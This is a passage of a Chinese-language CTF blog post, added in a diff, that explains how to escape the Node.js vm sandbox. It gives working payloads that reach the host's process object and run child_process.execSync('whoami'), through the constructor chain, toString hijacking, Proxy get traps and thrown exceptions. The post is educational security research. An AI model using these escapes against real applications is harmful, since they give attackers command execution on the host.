+<p>此外，在 REPL（交互式 shell）里 <code>require</code>/某些标识符是对 “全局/REPL realm” 可见的，而在模块文件（<code>node file.js</code>）里顶层 <code>require</code> 实际是由模块包装函数注入到<strong>模块局部作用域</strong>，不是全局变量。简单来说，上述实验只能在REPL中复现，而在实际环境中，必须借助<code>process.mainModule</code>引入需要的模块，如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;vm&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">y</span> <span class="o">=</span> <span class="sb">`this.toString.constructor(&#34;return process&#34;)()`</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nx">runInNewContext</span><span class="p">(</span><span class="nx">y</span><span class="p">)).</span><span class="nx">mainModule</span><span class="p">.</span><span class="nx">require</span><span class="p">(</span><span class="s2">&#34;child_process&#34;</span><span class="p">).</span><span class="nx">execSync</span><span class="p">(</span><span class="s2">&#34;whoami&#34;</span><span class="p">).</span><span class="nx">toString</span><span class="p">());</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>回过头来再研究这个函数：<code>vm.runInContext(script, context)</code>，不难发现前文所举的例子都是忽略context，只提供script。实际上，在忽略context的情况下，Node.js会自己创建一个空的上下文环境<code>{}</code>，显而易见地，script中的<code>this</code>直接代指这个空的上下文环境。</p>
+<p>在下文这个例子中：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;vm&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">script</span> <span class="o">=</span> <span class="sb">`m + n + this.m`</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">sandbox</span> <span class="o">=</span> <span class="p">{</span> <span class="nx">m</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">n</span><span class="o">:</span> <span class="mi">2</span> <span class="p">};</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">context</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">vm</span><span class="p">.</span><span class="nx">createContext</span><span class="p">(</span><span class="nx">sandbox</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">res</span> <span class="o">=</span> <span class="nx">vm</span><span class="p">.</span><span class="nx">runInContext</span><span class="p">(</span><span class="nx">script</span><span class="p">,</span> <span class="nx">context</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">res</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>vm.createContext()</code> 会对传入的 <code>sandbox</code> 进行特殊处理：让 <code>sandbox</code> 成为一个全局作用域容器，脚本执行时的 <code>this</code> 会指向这个对象；返回处理后的 <code>context</code> 对象——即被包装后的 <code>sandbox</code>，二者引用相同，修改 <code>context</code> 会同步影响 <code>sandbox</code>。</p>
+<p>上述代码的执行结果是</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="mi">4</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>显而易见地，<code>this.m</code>指向<code>sandbox</code>，这意味着我们虽然可以通过直接调用<code>this</code>来获取<code>Function</code>构造函数，但不可以使用<code>this.m</code>来获取，如下的代码可以正常运行并得到结果：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;vm&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">script</span> <span class="o">=</span> <span class="sb">`(() =&gt; {
+</span></span></span><span class="line"><span class="cl"><span class="sb">    const esc = this.constructor.constructor(&#34;return process&#34;)();
+</span></span></span><span class="line"><span class="cl"><span class="sb">    return esc.mainModule.require(&#39;child_process&#39;).execSync(&#39;whoami&#39;).toString();
+</span></span></span><span class="line"><span class="cl"><span class="sb">    })()`</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">sandbox</span> <span class="o">=</span> <span class="p">{</span> <span class="nx">m</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">n</span><span class="o">:</span> <span class="mi">2</span> <span class="p">};</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">context</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">vm</span><span class="p">.</span><span class="nx">createContext</span><span class="p">(</span><span class="nx">sandbox</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">res</span> <span class="o">=</span> <span class="nx">vm</span><span class="p">.</span><span class="nx">runInContext</span><span class="p">(</span><span class="nx">script</span><span class="p">,</span> <span class="nx">context</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">res</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然而，如果将代码改为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">script</span> <span class="o">=</span> <span class="sb">`(() =&gt; {
+</span></span></span><span class="line"><span class="cl"><span class="sb">    const esc = this.m.constructor.constructor(&#34;return process&#34;)();
+</span></span></span><span class="line"><span class="cl"><span class="sb">    return esc.mainModule.require(&#39;child_process&#39;).execSync(&#39;whoami&#39;).toString();
+</span></span></span><span class="line"><span class="cl"><span class="sb">    })()`</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>则不能实现。原因是<code>m</code>,<code>n</code>是基本数据类型而不是引用数据类型，如此进行的是值传递，无法拿到沙箱外部的引用。如果将<code>m</code>,<code>n</code>更改为引用数据类型类型，则可以执行：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;vm&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">script</span> <span class="o">=</span> <span class="sb">`(() =&gt; {
+</span></span></span><span class="line"><span class="cl"><span class="sb">    const esc = this.m.constructor.constructor(&#34;return process&#34;)();
+</span></span></span><span class="line"><span class="cl"><span class="sb">    return esc.mainModule.require(&#39;child_process&#39;).execSync(&#39;whoami&#39;).toString();
+</span></span></span><span class="line"><span class="cl"><span class="sb">    })()`</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">sandbox</span> <span class="o">=</span> <span class="p">{</span> <span class="nx">m</span><span class="o">:</span> <span class="p">[],</span> <span class="nx">n</span><span class="o">:</span> <span class="p">{}</span> <span class="p">};</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">context</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">vm</span><span class="p">.</span><span class="nx">createContext</span><span class="p">(</span><span class="nx">sandbox</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">res</span> <span class="o">=</span> <span class="nx">vm</span><span class="p">.</span><span class="nx">runInContext</span><span class="p">(</span><span class="nx">script</span><span class="p">,</span> <span class="nx">context</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">res</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="劫持tostring逃逸">劫持toString()逃逸
+</h4><p>更进一步地，如果考虑如下情景：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;vm&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">script</span> <span class="o">=</span> <span class="sb">`...`</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">sandbox</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">create</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">context</span> <span class="o">=</span> <span class="nx">vm</span><span class="p">.</span><span class="nx">createContext</span><span class="p">(</span><span class="nx">sandbox</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">res</span> <span class="o">=</span> <span class="nx">vm</span><span class="p">.</span><span class="nx">runInContext</span><span class="p">(</span><span class="nx">script</span><span class="p">,</span> <span class="nx">context</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Hello &#39;</span> <span class="o">+</span> <span class="nx">res</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>与前面情景不同的是，<code>sandbox</code>不是一个存在的对象，而是<code>null</code>，因此<code>this === null</code>，无法从内部调用。我们考虑能否使用外部已经存在的对象。</p>
+<p><code>arguments.callee</code> 是 JavaScript 中一个特殊的属性，它包含对当前正在执行的函数的引用。这个属性在匿名函数中尤其有用，因为匿名函数无法通过名称引用自身。然而，<code>arguments.callee</code>已被弃用，不推荐在现代 JavaScript 中使用，但这并不妨碍我们使用它。</p>
+<p>在<code>arguments</code>是函数内部的一个类数组对象，包含了当前函数被调用时传入的所有参数。它仅在函数内部可用，且与函数的参数列表对应。<code>arguments.callee</code>指向当前正在执行的函数本身，即函数自己。<a class="link" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Functions/arguments/callee"  target="_blank" rel="noopener"
+    >arguments.callee - JavaScript | MDN</a></p>
+<p>如果函数 <code>f</code> 是在全局作用域内调用的，则 <code>f.caller</code> 的值为<code>null</code>；否则它就是调用 <code>f</code> 的函数。如果调用 <code>f</code> 的函数是一个严格模式函数，则 <code>f.caller</code> 的值也是 <code>null</code>。<a class="link" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function/caller"  target="_blank" rel="noopener"
+    >Function.prototype.caller - JavaScript | MDN</a></p>
+<p>以此我们可以得到一个调用链：<code>arguments.callee.caller</code>，其中<code>arguments.callee</code>是一个函数，通过<code>caller</code>获得这个函数的引用。这个引用是在沙箱外，因此我们可以利用前文的思路来获得构造函数。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">script</span> <span class="o">=</span> <span class="sb">`(() =&gt; {
+</span></span></span><span class="line"><span class="cl"><span class="sb">    const a = {};
+</span></span></span><span class="line"><span class="cl"><span class="sb">    a.toString = function(){
+</span></span></span><span class="line"><span class="cl"><span class="sb">        const g = arguments.callee.caller;
+</span></span></span><span class="line"><span class="cl"><span class="sb">        const f = (g.toString.constructor(&#34;return process&#34;))();
+</span></span></span><span class="line"><span class="cl"><span class="sb">        return f.mainModule.require(&#39;child_process&#39;).execSync(&#39;whoami&#39;).toString();
+</span></span></span><span class="line"><span class="cl"><span class="sb">    }
+</span></span></span><span class="line"><span class="cl"><span class="sb">    return a;
+</span></span></span><span class="line"><span class="cl"><span class="sb">    })()`</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>把利用代码放到 <code>toString</code>或其他会被宿主隐式调用的魔术方法中，是为了让沙箱中定义的函数在宿主触发调用时，能够看到宿主调用栈中的函数，即 <code>arguments.callee.caller</code> 指向宿主函数，从而通过调用栈上那个宿主函数的 <code>constructor</code> 拿到宿主 realm 的 <code>Function</code> 构造器，再用它在宿主 realm 执行任意字符串代码，进而访问 <code>process</code> / <code>require</code> / <code>child_process</code>。</p>
+<p>此处的关键在于最后一行<code>console.log('Hello ' + res)</code>使用了<code>toString</code>方法，比较有局限性。</p>
+<p>这个过程可以概述为：</p>
+<ol>
+<li>在 vm 的 sandbox 中创建对象 <code>a</code>，并定义 <code>a.toString = function(){ ... }</code>。这个函数是在沙箱 realm创建的（其 [[Realm]]/内部所属是 sandbox）。</li>
+<li><code>vm.runInContext(...)</code> 返回该对象引用 <code>res</code> 到宿主模块（host）。</li>
+<li>宿主做 <code>'Hello ' + res</code> —— JS 规范要求对 <code>res</code> 做 ToPrimitive（字符串上下文），于是会调用 <code>res.toString()</code>（这是宿主触发的调用）。</li>
+<li>当宿主执行 <code>res.toString()</code> 时，调用栈上有宿主的函数，比如当前模块的执行函数，因此在 <code>toString</code> 内部使用 <code>arguments.callee.caller</code> 可以访问调用它的那个函数对象，即宿主的 caller。</li>
+<li>这个 caller 是宿主 realm 的函数对象，其 <code>.constructor</code> 指向宿主 realm 的 <code>Function</code>。于是 <code>cc.constructor.constructor('return process')()</code> 或等价语句会在宿主 realm 生成并执行一个新的函数，这个函数运行在宿主 realm，因此能看到宿主全局（包括 <code>process</code> / <code>require</code>）。</li>
+<li>拿到 <code>process</code> 后再 <code>process.mainModule.require('child_process').execSync('whoami')</code> 就能在宿主上执行命令。</li>
+</ol>
+<h4 id="proxy劫持get逃逸">Proxy劫持Get逃逸
+</h4><p><a class="link" href="https://juejin.cn/post/6844904090116292616"  target="_blank" rel="noopener"
+    >Proxy 和 Reflect - 掘金</a></p>
+<p>如果沙箱外没有执行字符串的相关操作来触发这个toString，并且也没有可以用来进行恶意重写的函数，我们可以用<code>Proxy</code>来劫持属性。</p>
+<p>JavaScript 规范中， <code>[[Get]]</code>，用于读取属性的内部方法， <code>[[Set]]</code>，用于写入属性的内部方法，等等。这些方法仅在规范中使用，我们不能直接通过方法名调用它们。</p>
+<p>我们可以利用<code>Proxy</code>绑架其调用属性的方法。代码如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;vm&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">script</span> <span class="o">=</span> 
+</span></span><span class="line"><span class="cl"><span class="sb">`
+</span></span></span><span class="line"><span class="cl"><span class="sb">(() =&gt;{
+</span></span></span><span class="line"><span class="cl"><span class="sb">    const a = new Proxy({}, {
+</span></span></span><span class="line"><span class="cl"><span class="sb">        get: function(){
+</span></span></span><span class="line"><span class="cl"><span class="sb">            const cc = arguments.callee.caller;
+</span></span></span><span class="line"><span class="cl"><span class="sb">            const p = (cc.constructor.constructor(&#39;return process&#39;))();
+</span></span></span><span class="line"><span class="cl"><span class="sb">            return p.mainModule.require(&#39;child_process&#39;).execSync(&#39;whoami&#39;).toString();
+</span></span></span><span class="line"><span class="cl"><span class="sb">        }
+</span></span></span><span class="line"><span class="cl"><span class="sb">    })
+</span></span></span><span class="line"><span class="cl"><span class="sb">    return a
+</span></span></span><span class="line"><span class="cl"><span class="sb">})()
+</span></span></span><span class="line"><span class="cl"><span class="sb">`</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">sandbox</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">create</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">context</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">vm</span><span class="p">.</span><span class="nx">createContext</span><span class="p">(</span><span class="nx">sandbox</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">res</span> <span class="o">=</span> <span class="nx">vm</span><span class="p">.</span><span class="nx">runInContext</span><span class="p">(</span><span class="nx">script</span><span class="p">,</span> <span class="nx">context</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">res</span><span class="p">.</span><span class="nx">abc</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;a&#34;</span> <span class="o">+</span> <span class="nx">res</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在<code>const res = vm.runInContext(script, context)</code>中，<code>res</code>获得到了逃逸出来的<code>Proxy</code>对象，在下一行调用任意一个属性（不一定需要这个属性存在）时，可以调用<code>[[get]]</code>方法，进而执行恶意代码。</p>
+<p>触发 <code>toString</code> 的常见场景：字符串拼接（<code>'a' + obj</code>）、模板字符串（<code>${obj}</code>）、显式调用 <code>String(obj)</code>、某些 <code>console</code>/inspect 操作（取决于实现），或 <code>obj + ''</code>。所以有多种办法可以调用。</p>
+<h4 id="异常捕获与处理逃逸">异常捕获与处理逃逸
+</h4><p>一些情况下，代码中不会给出res对象，也就是说执行沙箱后没有返回值被接收。对此可以考虑使用异常处理：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;vm&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">script</span> <span class="o">=</span> 
+</span></span><span class="line"><span class="cl"><span class="sb">`
+</span></span></span><span class="line"><span class="cl"><span class="sb">    throw new Proxy({}, {
+</span></span></span><span class="line"><span class="cl"><span class="sb">        get: function(){
+</span></span></span><span class="line"><span class="cl"><span class="sb">            const cc = arguments.callee.caller;
+</span></span></span><span class="line"><span class="cl"><span class="sb">            const p = (cc.constructor.constructor(&#39;return process&#39;))();
+</span></span></span><span class="line"><span class="cl"><span class="sb">            return p.mainModule.require(&#39;child_process&#39;).execSync(&#39;whoami&#39;).toString();
+</span></span></span><span class="line"><span class="cl"><span class="sb">        }
+</span></span></span><span class="line"><span class="cl"><span class="sb">    })
+</span></span></span><span class="line"><span class="cl"><span class="sb">`</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">vm</span><span class="p">.</span><span class="nx">runInContext</span><span class="p">(</span><span class="nx">script</span><span class="p">,</span> <span class="nx">vm</span><span class="p">.</span><span class="nx">createContext</span><span class="p">(</span><span class="nb">Object</span><span class="p">.</span><span class="nx">create</span><span class="p">(</span><span class="kc">null</span><span class="p">)));</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&#34;error:&#34;</span> <span class="o">+</span> <span class="nx">e</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>参考文章：</p>
+<p><a class="link" href="https://juejin.cn/post/6844904090116292616"  target="_blank" rel="noopener"
+    >https://juejin.cn/post/6844904090116292616</a></p>
+<p><a class="link" href="https://www.leavesongs.com/"  target="_blank" rel="noopener"
+    >https://www.leavesongs.com/</a></p>
+<p><a class="link" href="https://vulhub.org/zh"  target="_blank" rel="noopener"
+    >https://vulhub.org/zh</a></p>
+<h3 id="vm2沙箱">vm2沙箱
+</h3><p>&lt;TODO&gt;</p>
+<p><a class="link" href="https://www.cnblogs.com/zpchcbd/p/16899212.html"  target="_blank" rel="noopener"
+    >https://www.cnblogs.com/zpchcbd/p/16899212.html</a></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/ctf/">Ctf</a>
+        
+            <a href="/tags/web/">Web</a>
+        
+            <a href="/tags/nodejs/">NodeJS</a>
+        
+            <a href="/tags/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">沙箱逃逸</a>
+        
+            <a href="/tags/vm/">Vm</a>
+        
+            <a href="/tags/vm2/">Vm2</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+        <link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css"integrity="sha384-n8MVd4RsNIU0tAv4ct0nTaAbDJwPJzDEaqSD1odI&#43;WdtXRGWt2kTvGFasHpSy3SV"crossorigin="anonymous"
+            ><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js"integrity="sha384-XjKyOOlGwcjNTAIQHIpgOno0Hl1YQqzUOEleOLALmuqehneUG&#43;vnGctmUb0ZY0l8"crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js"integrity="sha384-&#43;VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4&#43;/RRE05"crossorigin="anonymous"
+                defer
+                >
+            </script><script>
+    window.addEventListener("DOMContentLoaded", () => {
+	const mainArticleElement = document.querySelector(".main-article");
+        renderMathInElement(mainArticleElement, {
+            delimiters: [
+                { left: "$$", right: "$$", display: true },
+                { left: "$", right: "$", display: false },
+                { left: "\\(", right: "\\)", display: false },
+                { left: "\\[", right: "\\]", display: true }
+            ],
+            ignoredClasses: ["gist"]
+        });})
+</script>
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/web%E5%AE%89%E5%85%A8%E4%B8%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AC%94%E8%AE%B0/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://youke1.picui.cn/s1/2025/08/04/68906f87178a7.png" loading="lazy" data-key="" data-hash="https://youke1.picui.cn/s1/2025/08/04/68906f87178a7.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Web安全与渗透测试笔记</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/php%E7%9A%84session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8E%E7%AB%9E%E4%BA%89/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">PHP的session文件包含与竞争</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/iscc2025%E9%83%A8%E5%88%86-wp/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://www.isclab.org.cn/wp-content/uploads/2019/12/15777937481.png" loading="lazy" data-key="" data-hash="https://www.isclab.org.cn/wp-content/uploads/2019/12/15777937481.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">ISCC2025部分 wp</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/%E5%9C%A8bits2sys%E5%88%B7%E9%A2%98%E7%9A%84%E4%B8%80%E4%BA%9Bwp01/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">在BITs2sys刷题的一些wp（01）</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/moectf2022%E7%9A%84%E4%B8%80%E4%BA%9Bwp%E5%B7%B2%E5%BA%9F%E5%BC%83/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Moectf2022的一些wp（已废弃）</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2025 lamaper
+    </section>
+    
+    <section class="powerby">
+        
+
+        <p>博客由 <b><a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a></b> 强力驱动，主题采用由 <b><a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a></b> 设计的 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="%s">Stack</a></b> ，并由 lamaper 个性化修改。</p>
+        
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
